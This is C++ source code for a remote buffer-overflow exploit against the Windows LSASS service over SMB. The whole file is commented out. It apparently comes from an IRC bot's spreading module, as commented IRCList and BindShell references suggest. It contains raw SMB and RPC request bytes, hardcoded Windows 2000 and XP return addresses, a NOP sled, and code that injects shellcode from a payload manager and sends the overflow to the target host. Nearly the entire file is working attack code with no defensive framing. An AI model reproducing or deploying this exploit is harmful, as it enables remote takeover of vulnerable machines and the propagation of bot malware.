/*#include <winsock2.h>
#include "exploit_lsass.h"

CHAR Req1[] =
"\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F"
"\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02"
"\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F"
"\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70"
"\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30"
"\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54"
"\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00";

CHAR Req2[] =
"\x00\x00\x00\xA4\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x00\x10\x00\x0C\xFF\x00\xA4\x00\x04\x11\x0A\x00\x00\x00\x00"
"\x00\x00\x00\x20\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x69\x00\x4E"
"\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xE0\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00"
"\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
"\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00"
"\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
"\x2E\x00\x30\x00\x00\x00\x00\x00";

CHAR Req3[] =
"\x00\x00\x00\xDA\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x20\x00\x0C\xFF\x00\xDA\x00\x04\x11\x0A\x00\x00\x00\x00"
"\x00\x00\x00\x57\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x9F\x00\x4E"
"\x54\x4C\x4D\x53\x53\x50\x00\x03\x00\x00\x00\x01\x00\x01\x00\x46"
"\x00\x00\x00\x00\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00\x40"
"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x06\x00\x06\x00\x40"
"\x00\x00\x00\x10\x00\x10\x00\x47\x00\x00\x00\x15\x8A\x88\xE0\x48"
"\x00\x4F\x00\x44\x00\x00\x81\x19\x6A\x7A\xF2\xE4\x49\x1C\x28\xAF"
"\x30\x25\x74\x10\x67\x53\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00"
"\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00"
"\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00"
"\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00"
"\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00\x00\x00";

CHAR Req4[] =
"\x00\x00\x00\x5C\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5C\x00\x08\x00\x01\x00\x31\x00\x00"
"\x5C\x00\x5C\x00\x31\x00\x39\x00\x32\x00\x2E\x00\x31\x00\x36\x00"
"\x38\x00\x2E\x00\x31\x00\x2E\x00\x32\x00\x31\x00\x30\x00\x5C\x00"
"\x49\x00\x50\x00\x43\x00\x24"
"\x00\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";

CHAR Req5[] =
"\x00\x00\x00\x64\xFF\x53\x4D\x42\xA2\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04"
"\x00\x08\x40\x00\x18\xFF\x00\xDE\xDE\x00\x0E\x00\x16\x00\x00\x00"
"\x00\x00\x00\x00\x9F\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00"
"\x02\x00\x00\x00\x03\x11\x00\x00\x5C\x00\x6C\x00\x73\x00\x61\x00"
"\x72\x00\x70\x00\x63\x00\x00\x00";

CHAR Req6[] =
"\x00\x00\x00\x9C\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04"
"\x00\x08\x50\x00\x10\x00\x00\x48\x00\x00\x00\x00\x04\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x48\x00\x54\x00\x02"
"\x00\x26\x00\x00\x40\x59\x00\x10\x5C\x00\x50\x00\x49\x00\x50\x00"
"\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x0B\x03\x10\x00\x00\x00"
"\x48\x00\x00\x00\x01\x00\x00\x00\xB8\x10\xB8\x10\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x01\x00\x6A\x28\x19\x39\x0C\xB1\xD0\x11"
"\x9B\xA8\x00\xC0\x4F\xD9\x2E\xF5\x00\x00\x00\x00\x04\x5D\x88\x8A"
"\xEB\x1C\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60\x02\x00\x00\x00";

CHAR Req7[] =
"\x00\x00\x0C\xF4\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04"
"\x00\x08\x60\x00\x10\x00\x00\xA0\x0C\x00\x00\x00\x04\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\xA0\x0C\x54\x00\x02"
"\x00\x26\x00\x00\x40\xB1\x0C\x10\x5C\x00\x50\x00\x49\x00\x50\x00"
"\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x00\x03\x10\x00\x00\x00"
"\xA0\x0C\x00\x00\x01\x00\x00\x00\x88\x0C\x00\x00\x00\x00\x09\x00"
"\xEC\x03\x00\x00\x00\x00\x00\x00\xEC\x03\x00\x00";

CHAR Shit1[] =
"\x95\x14\x40\x00\x03\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x7C\x70\x40\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x78\x85\x13\x00\xAB\x5B\xA6\xE9";

CHAR Req8[] =
"\x00\x00\x10\xF8\xFF\x53\x4D\x42\x2F\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x60\x00\x0E\xFF\x00\xDE\xDE\x00\x40\x00\x00\x00\x00\xFF"
"\xFF\xFF\xFF\x08\x00\xB8\x10\x00\x00\xB8\x10\x40\x00\x00\x00\x00"
"\x00\xB9\x10\xEE\x05\x00\x00\x01\x10\x00\x00\x00\xB8\x10\x00\x00"
"\x01\x00\x00\x00\x0C\x20\x00\x00\x00\x00\x09\x00\xAD\x0D\x00\x00"
"\x00\x00\x00\x00\xAD\x0D\x00\x00";

CHAR Req9[] =
"\x00\x00\x0F\xD8\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x18\x01"
"\x00\x08\x70\x00\x10\x00\x00\x84\x0F\x00\x00\x00\x04\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x84\x0F\x54\x00\x02"
"\x00\x26\x00\x00\x40\x95\x0F\x00\x5C\x00\x50\x00\x49\x00\x50\x00"
"\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x00\x02\x10\x00\x00\x00"
"\x84\x0F\x00\x00\x01\x00\x00\x00\x6C\x0F\x00\x00\x00\x00\x09\x00";

CHAR Shit3[] =
"\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x9A\xA8\x40\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00";

VOID ExploitLSASS::ExploitTarget(VOID){
	::Socket Socket = GetInitialSocket();

	LONG TargetOffset[] = {0x7515123c, 0x01004600};
	                          //2k        //xp

	#ifdef _DEBUG
	dprintf("** LSASS Connected\r\n");
	#endif
	CHAR Buffer[3500 + 1];
	CHAR SendBuf[(3500 + 1) * 2];
	CHAR SCReq[2000 + sizeof(Req7) + 1500 + 440];
	CHAR SCReq2K[4348 + 4060];
	CHAR SCReq2K2[4348 + 4060];
	CHAR RecvBuf[1600];
	CHAR HostIPC[40];
	CHAR HostIPC2[40 * 2];
	CHAR OSVer;
	CHAR Req4U[sizeof(Req4) + 20];
	CHAR StrAsm[]="\x66\x81\xEC\x1C\x07\xFF\xE4";
	CHAR StrBuffer[2000];
	sprintf(HostIPC, "\\\\%s\\ipc$", inet_ntoa(SocketFunction::Stoin(Socket.GetPeerAddr())));
	for(UINT i = 0; i < 40; i++) {
		HostIPC2[i * 2] = HostIPC[i];
		HostIPC2[(i * 2) + 1] = 0;
	}
	memcpy(Req4U, Req4, sizeof(Req4) - 1);
	memcpy(Req4U + 48, &HostIPC2[0], strlen(HostIPC) * 2);
	memcpy(Req4U + 47 + (strlen(HostIPC) * 2), Req4 + 87, 9);

	UINT SMBLen = 52 + (strlen(HostIPC) * 2);
	memcpy(Req4U + 3, &SMBLen, 1);

	UINT UNCLen = 9 + (strlen(HostIPC) * 2);
	memcpy(Req4U + 45, &UNCLen, 1);

	if(Socket.Send(Req1, sizeof(Req1) - 1) == SOCKET_ERROR)
		return;
	Socket.Recv(RecvBuf, sizeof(RecvBuf));
	if(Socket.Send(Req2, sizeof(Req2) - 1) == SOCKET_ERROR)
		return;
	Socket.Recv(RecvBuf, sizeof(RecvBuf));
	if(Socket.Send(Req3, sizeof(Req3) - 1) == SOCKET_ERROR)
		return;
	Socket.Recv(RecvBuf, sizeof(RecvBuf));
	CHAR Version[13];
	for(UINT i = 0; i < 12; i++)
		Version[i] = RecvBuf[48 + (i * 2)];
	Version[12] = NULL;

	if(strstr(Version, "5.0"))
		OSVer = 0;
	else if(strstr(Version, "5.1"))
		OSVer = 1;
	else
		return;

	#ifdef _DEBUG
	dprintf("** LSASS Operating system (%s) is ", inet_ntoa(SocketFunction::Stoin(Socket.GetPeerAddr())));
	#endif

	if(OSVer == 1){ // WinXP
		//strcat(Temp, "WinXP");
		//IRCList.Notify(Temp);
		#ifdef _DEBUG
		dprintf("WinXP\r\n");
		#endif
		memset(StrBuffer, 0x90, 2000);
		//memcpy(StrBuffer + 160, BindShell, strlen(BindShell));
		//dprintf("winxp\r\n");
		Exploits.Mutex.WaitForAccess();
		if(!Exploits.GetPayload()){
			Exploits.Mutex.Release();
			return;
		}
		memcpy(StrBuffer + 160, Exploits.GetPayload()->GetShellcode(), Exploits.GetPayload()->GetShellcodeSize());
		Exploits.Mutex.Release();
		//for(UINT i = 0; i < Exploits.GetPayload()->GetShellcodeSize(); i++)
		//	dprintf("\\x%.2X", (BYTE)Exploits.GetPayload()->GetShellcode()[i]);
		memcpy(StrBuffer + 1980, StrAsm, strlen(StrAsm));
		*(LONG*)&StrBuffer[1964] = TargetOffset[OSVer];
	}else{ // Win2K
		//strcat(Temp, "Win2K");
		//IRCList.Notify(Temp);
		#ifdef _DEBUG
		dprintf("Win2K\r\n");
		#endif
		memset(Buffer, 0x90, 3500);

		memcpy(&Buffer[2020], &TargetOffset[OSVer], 4);
		//memcpy(&Buffer[2036], BindShell, strlen(BindShell));
		Exploits.Mutex.WaitForAccess();
		if(!Exploits.GetPayload()){
			Exploits.Mutex.Release();
			return;
		}
		memcpy(&Buffer[2036], Exploits.GetPayload()->GetShellcode(), Exploits.GetPayload()->GetShellcodeSize());

		memcpy(&Buffer[2840], "\xEB\x06\xEB\x06", 4);
		memcpy(&Buffer[2844], &TargetOffset[OSVer], 4); // jmp ebx addr

		//memcpy(&Buffer[2856], BindShell, strlen(BindShell));
		memcpy(&Buffer[2856], Exploits.GetPayload()->GetShellcode(), Exploits.GetPayload()->GetShellcodeSize());
		Exploits.Mutex.Release();

		for(UINT i = 0; i < 3500; i++){
			SendBuf[i * 2] = Buffer[i];
			SendBuf[i * 2 + 1] = 0;
		}

		SendBuf[3500 * 2] = 0;
		SendBuf[3500 * 2 + 1] = 0;

		memset(SCReq2K, 0x31, (2000 + sizeof(Req7) + 1500) * 2);
		memset(SCReq2K2, 0x31, (2000 + sizeof(Req7) + 1500) * 2);
	}
	memset(SCReq, 0x31, 2000 + sizeof(Req7) + 1500);

	if(Socket.Send(Req4U, SMBLen + 4) == SOCKET_ERROR)
		return;
	Socket.Recv(RecvBuf, sizeof(RecvBuf));
	if(Socket.Send(Req5, sizeof(Req5) - 1) == SOCKET_ERROR)
		return;
	Socket.Recv(RecvBuf, sizeof(RecvBuf));
	if(Socket.Send(Req6, sizeof(Req6) - 1) == SOCKET_ERROR)
		return;
	Socket.Recv(RecvBuf, sizeof(RecvBuf));

	if(OSVer == 1){ // WinXP
		memcpy(SCReq, Req7, sizeof(Req7) - 1);
		memcpy(SCReq + sizeof(Req7) - 1, &StrBuffer[0], 2000);
		memcpy(SCReq + sizeof(Req7) - 1 + 2000, Shit1, 9 * 16);

		SCReq[2000 + sizeof(Req7) - 1 + 1500 - 304 - 1] = 0;
		if(Socket.Send(SCReq, 2000 + sizeof(Req7) - 1 + 1500 - 304) == SOCKET_ERROR)
			return;
	}else{ // Win2K
		memcpy(SCReq2K, Req8, sizeof(Req8) - 1);
		memcpy(SCReq2K + sizeof(Req8) - 1, SendBuf, ((3500 + 1) * 2));

		memcpy(SCReq2K2, Req9, sizeof(Req9) - 1);
		memcpy(SCReq2K2 + sizeof(Req9) - 1, SendBuf + 4348 - sizeof(Req8) + 1, ((3500 + 1) * 2) - 4348);

		memcpy(SCReq2K2 + sizeof(Req9) - 1 + ((3500 + 1) * 2) - 4348 - sizeof(Req8) + 1 + 206, Shit3, sizeof(Shit3) - 1);
		if(Socket.Send(SCReq2K, 4348) == SOCKET_ERROR)
			return;

		Socket.Recv(RecvBuf, sizeof(RecvBuf));
		if(Socket.Send(SCReq2K2, 4060) == SOCKET_ERROR)
			return;
	}

	Socket.Recv(RecvBuf, sizeof(RecvBuf));
}*/